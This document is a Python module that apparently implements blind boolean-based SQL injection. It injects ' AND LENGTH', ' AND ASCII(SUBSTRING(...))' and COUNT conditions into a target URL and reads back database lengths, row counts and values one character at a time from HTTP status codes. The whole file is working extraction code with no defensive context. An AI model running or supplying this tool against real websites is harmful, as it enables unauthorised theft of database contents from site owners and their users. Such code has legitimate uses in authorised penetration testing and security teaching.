import requests

from imports.sys_helpers import *

def get_length(payload,base_url,success_code):
	answer_len = 1
	write_val("Length: %i" % answer_len)
	while True:
		url = base_url + " AND LENGTH((%s)) = %i" % (payload,answer_len)
		rs = requests.get(url)
		if rs.status_code == success_code:
			erase_value("Length: %i" % answer_len)
			return answer_len

		overwrite(answer_len,answer_len+1)
		answer_len += 1

def get_value(payload,length,known_start,base_url,success_code):
	result = ""
	if known_start != None:
		result = known_start

	write_val("Value: %s" % result)
	for pos in range(len(result)+1,length+1):
		for char_code in range(32,128):
			url = base_url + " AND ASCII(SUBSTRING((%s),%i,1)) = %s" % (payload,pos,char_code)
			rs = requests.get(url)
			if rs.status_code == success_code:
				result += chr(char_code)
				write_val(chr(char_code))
				break
	erase_value("Value: %s" % result)
	return result

def get_count(payload, base_url, success_code):
	answer_len = 1
	write_val("Count: %i" % answer_len)
	while True:
		url = base_url + " AND (select COUNT(*) from (%s) as T2) = %i" % (payload,answer_len)
		rs = requests.get(url)
		if rs.status_code == success_code:
			erase_value("Count: %i" % answer_len)
			return answer_len

		overwrite(answer_len,answer_len+1)
		answer_len += 1

def get_values(payload, base_url, success_code):
	payload = payload
	value_count = get_count(payload, base_url, success_code)
	for limit in range(1,value_count):
		length = get_length("%s limit %i,1" % (payload,limit), base_url, success_code)
		yield get_value("%s limit %i,1" % (payload,limit), length, None, base_url, success_code)